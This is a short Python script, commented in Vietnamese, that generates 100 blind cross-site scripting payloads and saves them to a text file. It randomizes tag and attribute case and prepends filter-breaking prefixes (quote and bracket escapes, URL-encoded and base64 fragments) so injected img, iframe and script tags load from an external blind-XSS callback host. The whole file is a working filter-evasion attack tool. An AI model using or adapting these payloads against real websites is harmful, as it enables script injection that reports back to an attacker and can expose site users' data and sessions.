import random

# Các thẻ HTML và thuộc tính để thử nghiệm
tags = ['<img', '<iframe', '<script', '<a','<body','<video','<audio','<embed','<source']
attributes = ['src', 'href']
prefix = [r'',r'',r'',r'',r'',r'',r'',r'',r"'>\"", r'\">', r'<"', r'><', r'>"<', r'.\>"</.', r'./>%20<./', r'/>%20<', r'%20/%20>', r'%20">%20<', r'%3E%3C', r'Pjw=']
# URL đích mà bạn muốn trỏ tới
url = 'https://xss.report/c/aptx4869'

def randomize_case(text):
    # Viết hoa ngẫu nhiên các chữ cái trong chuỗi
    return ''.join(random.choice([char.upper(), char.lower()]) for char in text)

# def insert_comments(text):
#     # Chèn các comment `/**/` ngẫu nhiên vào trong chuỗi
#     parts = list(text)
#     for i in range(random.randint(1, 2)):  # Chèn từ 1 đến 2 comment
#         pos = random.randint(2, len(parts) - 2)
#         parts.insert(pos, '/**/')
#     return ''.join(parts)

def generate_blind_xss_payload():
    tag = randomize_case(random.choice(tags))
    attr = randomize_case(random.choice(attributes))
    pr = randomize_case(random.choice(prefix))
    # Xây dựng payload trỏ trực tiếp đến URL với viết hoa ngẫu nhiên và thêm comment
    payload_string = f'{pr}{tag} {attr}="{url}"></{tag.strip("<")+ ">"}'
    return payload_string

# Đường dẫn và tên tệp bạn muốn lưu payload
file_path = "blind_payload.txt"

# Mở tệp trong chế độ ghi và lưu tất cả payloads vào tệp
with open(file_path, "w", encoding="utf-8") as file:
    for _ in range(100):
        file.write(generate_blind_xss_payload() + "\n")

print(f"Payloads đã được lưu vào tệp {file_path}")
